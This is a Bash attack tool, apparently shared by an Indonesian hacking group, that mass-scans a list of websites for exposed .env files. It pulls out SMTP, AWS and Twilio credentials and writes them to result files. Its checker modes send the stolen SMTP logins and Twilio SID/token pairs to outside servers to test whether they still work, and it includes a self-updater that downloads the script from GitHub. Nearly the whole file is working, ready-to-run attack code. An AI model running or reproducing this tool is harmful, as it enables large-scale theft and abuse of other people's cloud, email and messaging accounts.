#!/usr/bin/env bash
# NakoCode x TatsumiCREW Family
# 26-July-2020
clear

merah='\e[91m'
cyan='\e[96m'
kuning='\e[93m'
oren='\033[0;33m' 
margenta='\e[95m'
biru='\e[94m'
ijo="\e[92m"
putih="\e[97m"
normal='\033[0m'
bold='\e[1m'
labelmerah='\e[41m'
labelijo='\e[42m'
labelkuning='\e[43m'
updater() {
	echo "Checking integrity file to server..."
	localShellCode=`cat $0 | sha256sum`
	cloudShellCode=`curl "https://raw.githubusercontent.com/nako48/Gabut-Project/master/haruka.sh" -s | sha256sum`
	if [[ $localShellCode != $cloudShellCode ]]; then
		echo "Updating script... Please wait."
		wget "https://raw.githubusercontent.com/nako48/Gabut-Project/master/haruka.sh"
		echo "File successfully updated on `date`."
	else
		echo "Script are up to date"
	fi
	exit 1
}
while getopts ":i:r:l:t:dchu" o; do
	case "${o}" in
		u)
updater
;;
esac
done
TwilliocURL(){
	gET=$(curl -skL --connect-timeout 15 --max-time 15 "http://35.223.155.178/twiliocheck.php?send=$1" -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: id,en-US;q=0.7,en;q=0.3' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' -H 'TE: Trailers' -L)
}
TwilioREsulT(){
	TwilliocURL $1
	credit=$(echo $gET | grep -Po '(?<=Balance":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
	phone=$(echo $gET | grep -Po '(?<=Phone":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
	type=$(echo $gET | grep -Po '(?<=Type":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
	statusaccount=$(echo $gET | grep -Po '(?<=error":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
	if [[ $statusaccount =~ "200" ]]; then
		printf "${labelijo}-- TWILIO LIVE --${normal} ${bold} ${1}|${2} - $credit ($type)\n"
		echo "WORKED => $keyna|$secret - $credit ($type) ($phone)">>result/twilioinfo.txt
	else
		printf "${labelmerah}-- TWILIO ERROR --${normal} ${bold} ${1}\n"
	fi	
}
cURLRest(){
	gET=$(curl -skL --connect-timeout 20 --max-time 20 "http://smtp.kudoharuka.xyz/smtp-checker.php?o=$1&emailto=$2" -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: id,en-US;q=0.7,en;q=0.3' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' -H 'TE: Trailers' -L)
}
ReSult(){
	cURLRest $1 $2
	if [[ $gET =~ "Terkirim" ]]; then
		echo -e "${labelijo}-- SEND SUKSES --${normal} ${bold} ${1}"
		echo "WORKED => $1">>result/smtpwork.txt
	else
		echo -e "${labelmerah}-- SEND ERROR --${normal} ${bold} ${1}"
		echo "DEAD => $1">>result/smtpdead.txt
	fi

}
gEtSMTP(){
	gET=$(curl -skL --connect-timeout 20 --max-time 20 "$1/.env" -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: id,en-US;q=0.7,en;q=0.3' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' -H 'TE: Trailers' -L)
}
AWsCrackeD1(){
	gEtSMTP $1
	AWS_KEY1=$(echo $gET | grep -Po '(?<=AWS_ACCESS_KEY_ID=)[^ ]*')
	AWS_SECRET1=$(echo $gET | grep -Po '(?<=AWS_SECRET_ACCESS_KEY=)[^ ]*')
	AWS_REGION1=$(echo $gET | grep -Po '(?<=AWS_DEFAULT_REGION=)[^ ]*')
	if [[ $gET =~ "AWS_ACCESS_KEY_ID=AKIA" ]]; then
		AWS1="$1 => $AWS_KEY1|$AWS_SECRET1|$AWS_REGION1"
		printf "${labelijo}-- AWS LIVE --${normal} ${bold} ${1}\n"
		echo "$AWS1">>result/aws.txt
	else
		printf "${labelmerah}-- DEAD --${normal} ${bold} ${1}\n"
		echo "$1">>result/aws-die.txt
	fi

}
AWsCrackeD2(){
	gEtSMTP $1
	AWS_KEY2=$(echo $gET | grep -Po '(?<=AWS_KEY=)[^ ]*')
	AWS_SECRET2=$(echo $gET | grep -Po '(?<=AWS_SECRET=)[^ ]*')
	AWS_REGION2=$(echo $gET | grep -Po '(?<=AWS_REGION=)[^ ]*')
	if [[ $gET =~ "AWS_KEY=AKIA" ]]; then
		AWS2="$1 => $AWS_KEY2|$AWS_SECRET2|$AWS_REGION2"
		printf "${labelijo}-- AWS LIVE --${normal} ${bold} ${1}\n"
		echo "$AWS2">>result/aws.txt
	else
		printf "${labelmerah}-- DEAD --${normal} ${bold} ${1}\n"
		echo "$1">>result/aws-die.txt
	fi

}
SMTP(){
	gEtSMTP $1
	HOST=$(echo "$gET" | grep -Po "(?<=MAIL_HOST=)[^\\n]*" | head -1)
	MAIL_PORT=$(echo "$gET" | grep -Po '(?<=MAIL_PORT=)[^ ]*' | head -1)
	MAIL_USERNAME=$(echo "$gET" | grep -Po '(?<=MAIL_USERNAME=)[^ ]*' | head -1)
	MAIL_PASSWORD=$(echo "$gET" | grep -Po '(?<=MAIL_PASSWORD=)[^ ]*' | head -1)
	if [[ $gET =~ "MAIL_HOST" ]]; then
		if [[ ! -z $MAIL_USERNAME ]] || [[ ! -z $MAIL_PASSWORD ]] || [[ ! -z $HOST ]]; then
			if [[ $MAIL_USERNAME =~ (null|nul|\*\*\*) ]] || [[ $MAIL_PASSWORD =~ (null|nul|\*\*\*) ]] || [[ $HOST =~ (mailtrap\.io|null|nul|localhost|\*\*\*) ]]; then
				printf "${labelkuning}-- BAAD --${normal} ${bold} ${1} (have null result or mailtrap smtp)\n"
				echo "$1">>result/smtp-bad.txt
			else
				SMTP="$1 => $HOST|$MAIL_PORT|$MAIL_USERNAME|$MAIL_PASSWORD"
				SMTP=$(echo "$SMTP" | tr -d "\r" | tr -d "\"")
				printf "${labelijo}-- SMTP LIVE --${normal} ${bold} $1\n"
				echo "$SMTP">>result/smtp.txt
			fi
		else
			printf "${labelkuning}-- BAAD --${normal} ${bold} ${1} (have null result or mailtrap smtp)\n"
			echo "$1">>result/smtp-bad.txt
		fi
	else
		printf "${labelmerah}-- DEAD --${normal} ${bold} ${1}\n"
		echo "$1">>result/smtp-die.txt
	fi

}
TWILIO(){
	gEtSMTP $1
	SID=$(echo $gET | grep -Po '(?<=TWILIO_SID=")[^"]*' | head -1)
	TOKEN=$(echo $gET | grep -Po '(?<=TWILIO_AUTH_TOKEN=")[^"]*' | head -1)
	if [[ $gET =~ "TWILIO" ]]; then
		SMTP="$SID|$TOKEN"
		printf "${labelijo}-- TWILIO LIVE --${normal} ${bold} ${1}\n"
		echo "$SMTP">>result/smtp.txt
	else
		printf "${labelmerah}-- DEAD --${normal} ${bold} ${1}\n"
		echo "$1">>result/twilio-die.txt
	fi

}
ProSeS(){
	SMTP $1 && AWsCrackeD2 $1 && AWsCrackeD1 $1 && TWILIO $1
}
ProSeSS(){
	ReSult $1 $2
}
ProSeSTwilio(){
	TwilioREsulT $1 $2
}
if [[ ! -d result ]]; then
	mkdir result
fi
cat << "EOF"
                      .".
                     /  |
                    /  /
                   / ,"
       .-------.--- /
      "._ __.-/ o. o\
         "   (    Y  )
              )     /
             /     (
            /       Y
        .-"         |
       /  _     \    \
      /    `. ". ) /' )
     Y       )( / /(,/
    ,|      /     )
   ( |     /     /
    " \_  (__   (__        [Gabut Tools V0.5 By Tatsumi-Crew.NET]
        "-._,)--._,)       [ Thanks For IDLIVE - Monkey B Luffy ]
EOF
echo ""
echo "Method : "
echo "1. Scanner SMTP/AWS-SMS/TWILIO" 
echo "2. SMTP CHECKER" 
echo "3. TWILIO CHECKER"
read -p "Choose Your Method : " pilihan;

if [ $pilihan -eq 1 ]; then
	read -p "Select Your List: " listo;

	IFS=$'\r\n' GLOBIGNORE='*' command eval 'list=($(cat $listo))'
	for (( i = 0; i < "${#list[@]}"; i++ )); 
	do
		target="${list[$i]}"
		((cthread=cthread%5)); ((cthread++==0)) && wait
		ProSeS ${target} &
	done
	wait
elif [ $pilihan -eq "2" ]; then
	echo "HOST|PORT|Username|Password"
	read -p "Select Your List : " listo;
	read -p "Email to : " kirimke;

	IFS=$'\r\n' GLOBIGNORE='*' command eval 'list=($(cat $listo))'
	for (( i = 0; i < "${#list[@]}"; i++ )); do
		AMPAS="${list[$i]}"
		IFS='' read -r -a array <<< "$AMPAS"
		target=${array[0]}
		((cthread=cthread%1)); ((cthread++==0)) && wait
		ProSeSS ${target} ${kirimke} &
	done
	wait
elif [ $pilihan -eq "3" ]; then
	echo "SID|AUTH TOKEN"
	read -p "Select Your List : " listna;

	IFS=$'\r\n' GLOBIGNORE='*' command eval 'bacot=($(cat $listna))'
	waktumulai=$(date +%s)
	for (( i = 0; i <"${#bacot[@]}"; i++ )); do
		WOW="${bacot[$i]}"
		IFS='' read -r -a array <<< "$WOW"
		keyna=${array[0]}
		((cthread=cthread%2)); ((cthread++==0)) && wait
		ProSeSTwilio ${keyna} &
	done
	wait
fi
